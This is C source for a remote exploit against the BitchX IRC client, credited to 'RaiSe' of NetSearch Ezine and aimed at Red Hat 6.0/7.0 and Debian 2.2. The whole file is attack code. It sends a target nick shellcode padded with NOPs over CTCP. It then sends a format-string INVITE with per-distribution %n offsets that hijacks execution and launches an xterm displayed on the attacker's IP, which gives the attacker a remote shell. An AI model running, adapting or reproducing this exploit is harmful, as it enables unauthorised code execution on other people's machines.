/*
 *  BitchX Xploit by RaiSe
 *  Tested with version 1.0c16(+) in:        redhat 6.0 (2.2.16)
 *                                           redhat 7.0 (2.2.16)
 *                                           debian 2.2 (2.2.16)
 *
 *  NetSearch Ezine Staff
 *  http://www.netsearch-ezine.com
 *
 */


#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>

#define PORT 6667

int soc_local,snick;
struct sockaddr_in addr_local;
struct hostent *server;
char buf[1024], cmd[512], formatbuf[1024], ip[64], *p;

int irc(char *n,char *s,char *sc);
int format(int v);

static char shellcode[256] =    // by RaiSe
"\xeb\x5b\x5e\x31\xc0\xb0\x02\x31\xdb\xcd\x80\x39\xc3\x75\x47\x31"
"\xd2\x88\x56\x14\x88\x56\x18\x88\x56\x21\xb2\x2b\x31\xc9\xb1\x09"
"\x80\x3c\x32\x4b\x74\x05\x42\xe2\xf7\xeb\x2b\x88\x34\x32\x31\xd2"
"\x89\xf3\x89\x76\x36\x8d\x7e\x15\x89\x7e\x3a\x8d\x7e\x19\x89\x7e"
"\x3e\x8d\x7e\x22\x89\x7e\x42\x89\x56\x46\x8d\x4e\x36\x8d\x56\x46"
"\x31\xc0\xb0\x0b\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xa0\xff"
"\xff\xff/usr/X11R6/bin/xterm8-ut8-display8";

char nops4[] = "\x90\x90\x90\x90";


// main()
int main(int argc, char *argv[])
{

        if (argc!=5)
        {       
                printf("\nBitchX Xploit by RaiSe\n");
                printf("http://www.netsearch-ezine.com\n");
                printf("\nuse: %s nick irc-server my-ip dist\n",argv[0]);
                printf("\ndist = 1 --> redhat 6.0\n"
                                "dist = 2 --> redhat 7.0\n"
                                "dist = 3 --> debian 2.2\n\n");
                exit(0);
        }

        sprintf(ip,"%s:0K",argv[3]);
        strcat(shellcode,ip);

        printf("\nBitchX Xploit by RaiSe\n");
        printf("http://www.netsearch-ezine.com\n");
        puts("\ndoing it..");

        snick=strlen(argv[1]);
        format(atoi(argv[4]));
        irc (argv[1],argv[2],formatbuf);
        printf("finished\n\n");

        return(0);

} // end main()

// irc()
int irc(char *n,char *s,char *sc)
{

        if ((server = gethostbyname(s)) == 0) 
        {
                printf("error al resolver el host\n");
                exit(0);
        }

        if ((soc_local=socket(AF_INET,SOCK_STREAM,0)) == -1)
        {
                printf("error al crear el socket\n");
                exit(0);
        }

        bzero((char *) &addr_local, sizeof(addr_local));

        addr_local.sin_family = AF_INET;
        addr_local.sin_port = htons(PORT);
        memcpy(&addr_local.sin_addr, server->h_addr, server->h_length);

        if ((connect(soc_local,(struct sockaddr *) &addr_local,sizeof(addr_local)))
                        == -1)
        {
                printf("error al conectar con el servidor\n");
                exit(0);
        }

        p=buf;

        // user
        sprintf(cmd,"user k k k k\n");
        write(soc_local,cmd,strlen(cmd));

        // nick
        sprintf(cmd,"nick rxkfe\n");
        write(soc_local,cmd,strlen(cmd));

        // pong
        while(1)
        {
                read(soc_local,p,1);
                if ((*p=='\n') && (strstr(buf,"PING :")))
                {
                        p = (strstr(buf,"PING :")) + strlen("PING :");
                        sprintf(cmd,"PONG %s",p);
                        write(soc_local,cmd,strlen(cmd));
                        break;
                }
                if (*p=='\n')
                        p=buf;
                p++;
        } 

        // ctcp
        sprintf(cmd,"privmsg %s :\x01%s%s%s%s%s%s\x01\n"
                        ,n,nops4,nops4,nops4,nops4,nops4,shellcode);

        write(soc_local,cmd,strlen(cmd));

        sleep(2);

        // invite
        sprintf(cmd,"invite %s #%s\n",n,sc);
        write(soc_local,cmd,strlen(cmd));

        sleep(2);
        return(0);

} // end irc()

// format()
int format(int v)
{

        if ((v!=1) && (v!=2) && (v!=3))
        {
                printf("\ndist = 1 --> redhat 6.0\n"
                       "dist = 2 --> redhat 7.0\n"
                       "dist = 3 --> debian 2.2\n\n");
                printf("exiting..\n\n");
                exit(0);
        }


if (v==1)
{
int n, nr, a1, nx, nn = 0x150;
char dire[4][8] = { "\x60","\x61","\x62","\x63" };
int a2 = 0x1b5 - 0xdb;
int a3 = 0xff - 0xb5;
int a4 = 0x1bf - 0xff;
char xx[1024], nops[256];

switch(snick)
{
case 1:
        sprintf(nops,"\x90%s",nops4);
        nx = 126;
        nr = 0x6;
        break;
case 2:
        sprintf(nops,"%s",nops4);
        nx = 126;
        nr = 0x5;
        break;
case 3:
        sprintf(nops,"\x90\x90\x90");
        nx = 126;
        nr = 0x4;
        break;
case 4:
        sprintf(nops,"\x90\x90");
        nx = 126;
        nr = 0x3;
        break;
case 5:
        sprintf(nops,"\x90");
        nx = 126;
        nr = 0x2;
        break;
case 6:
        sprintf(nops,"%s",nops4);
        nx = 129;
        nr = 0x5;
        nn = 0x158;
        break;
case 7:
        sprintf(nops,"\x90\x90\x90");
        nx = 129;
        nr = 0x4;
        nn = 0x158;
        break;
case 8:
        sprintf(nops,"\x90\x90");
        nx = 129;
        nr = 0x3;
        nn = 0x158;
        break;
case 9:
        sprintf(nops,"\x90");
        nx = 129;
        nr = 0x2;
        nn = 0x158;
}

a1 = 0x10db - nn - 0x10 - 0xc - nr;

  for (n = 0; n < nx ; n += 3)
    strcpy(&xx[n], "%8x");

  sprintf(formatbuf,
         "%s"
         "%s\xea\xff\xbf"
         "%s"
         "%s\xea\xff\xbf"
         "%s"
         "%s\xea\xff\xbf"
         "%s"
         "%s\xea\xff\xbf"
         "%s"
         "%%%dx%%n"
         "%%%dx%%n"
         "%%%dx%%n"
         "%%%dx%%n"
         ,nops,dire[0],nops4,dire[1],nops4,dire[2],
         nops4,dire[3],xx,a1,a2,a3,a4);
}

if (v==2)
{
int n, nr, a1, nx, nn = 0x138;
char dire[4][8] = { "\xbc","\xbd","\xbe","\xbf" };
int a2 = 0x1b2 - 0xc1;
int a3 = 0xff - 0xb2;
int a4 = 0x1bf - 0xff;
char xx[1024], nops[256];

switch(snick)
{
case 1:
        sprintf(nops,"\x90%s",nops4);
        nx = 117;
        nr = 0x6;
        strcpy(dire[0],"\xbc");
        strcpy(dire[1],"\xbd");
        strcpy(dire[2],"\xbe");
        strcpy(dire[3],"\xbf");
        break;
case 2:
        sprintf(nops,"%s",nops4);
        nx = 117;
        nr = 0x5;
        strcpy(dire[0],"\xbc");
        strcpy(dire[1],"\xbd");
        strcpy(dire[2],"\xbe");
        strcpy(dire[3],"\xbf");
        break;
case 3:
        sprintf(nops,"\x90\x90\x90");
        nx = 117;
        nr = 0x4;
        strcpy(dire[0],"\xbc");
        strcpy(dire[1],"\xbd");
        strcpy(dire[2],"\xbe");
        strcpy(dire[3],"\xbf");
        break;
case 4:
        sprintf(nops,"\x90\x90");
        nx = 117;
        nr = 0x3;
        strcpy(dire[0],"\xbc");
        strcpy(dire[1],"\xbd");
        strcpy(dire[2],"\xbe");
        strcpy(dire[3],"\xbf");
        break;
case 5:
        sprintf(nops,"\x90");
        nx = 117;
        nr = 0x2;
        break;
case 6:
        sprintf(nops,"%s",nops4);
        nx = 120;
        nr = 0x5;
        nn = 0x140;
        break;
case 7:
        sprintf(nops,"\x90\x90\x90");
        nx = 120;
        nr = 0x4;
        nn = 0x140;
        break;
case 8:
        sprintf(nops,"\x90\x90");
        nx = 120;
        nr = 0x3;
        nn = 0x140;
        break;
case 9:
        sprintf(nops,"\x90");
        nx = 120;
        nr = 0x2;
        nn = 0x140;
}

a1 = 0x10c1 - nn - 0x10 - 0xc - nr;

  for (n = 0; n < nx ; n += 3)
    strcpy(&xx[n], "%8x");

  sprintf(formatbuf,
         "%s"
         "%s\xe7\xff\xbf"
         "%s"
         "%s\xe7\xff\xbf"
         "%s"
         "%s\xe7\xff\xbf"
         "%s"
         "%s\xe7\xff\xbf"
         "%s"
         "%%%dx%%n"
         "%%%dx%%n"
         "%%%dx%%n"
         "%%%dx%%n"
         ,nops,dire[0],nops4,dire[1],nops4,dire[2],
         nops4,dire[3],xx,a1,a2,a3,a4);
}

if (v==3)
{
int n, nr, a1, nx, nn = 0x180;
char dire[4][8] = { "\x80","\x81","\x82","\x83" };
int a2 = 0x1b3 - 0xa4;
int a3 = 0xff - 0xb3;
int a4 = 0x1bf - 0xff;
char xx[1024], nops[256];

switch(snick)
{
case 1:
        sprintf(nops,"\x90%s",nops4);
        nx = 144;
        nr = 0x6;
        break;
case 2:
        sprintf(nops,"%s",nops4);
        nx = 144;
        nr = 0x5;
        break;
case 3:
        sprintf(nops,"\x90\x90\x90");
        nx = 144;
        nr = 0x4;
        break;
case 4:
        sprintf(nops,"\x90\x90");
        nx = 144;
        nr = 0x3;
        break;
case 5:
        sprintf(nops,"\x90");
        nx = 144;
        nr = 0x2;
        break;
case 6:
        sprintf(nops,"%s",nops4);
        nx = 147;
        nr = 0x5;
        nn = 0x188;
        break;
case 7:
        sprintf(nops,"\x90\x90\x90");
        nx = 147;
        nr = 0x4;
        nn = 0x188;
        break;
case 8:
        sprintf(nops,"\x90\x90");
        nx = 147;
        nr = 0x3;
        nn = 0x188;
        break;
case 9:
        sprintf(nops,"\x90");
        nx = 147;
        nr = 0x2;
        nn = 0x188;
        strcpy(dire[0],"\x70");
        strcpy(dire[1],"\x71");
        strcpy(dire[2],"\x72");
        strcpy(dire[3],"\x73");
}

a1 = 0x10a4 - nn - 0x10 - 0xc - nr;

  for (n = 0; n < nx ; n += 3)
    strcpy(&xx[n], "%8x");

  sprintf(formatbuf,
         "%s"
         "%s\xe8\xff\xbf"
         "%s"
         "%s\xe8\xff\xbf"
         "%s"
         "%s\xe8\xff\xbf"
         "%s"
         "%s\xe8\xff\xbf"
         "%s"
         "%%%dx%%n"
         "%%%dx%%n"
         "%%%dx%%n"
         "%%%dx%%n"
         ,nops,dire[0],nops4,dire[1],nops4,dire[2],
         nops4,dire[3],xx,a1,a2,a3,a4);
}

return(0);

} // end format()

// 0x00
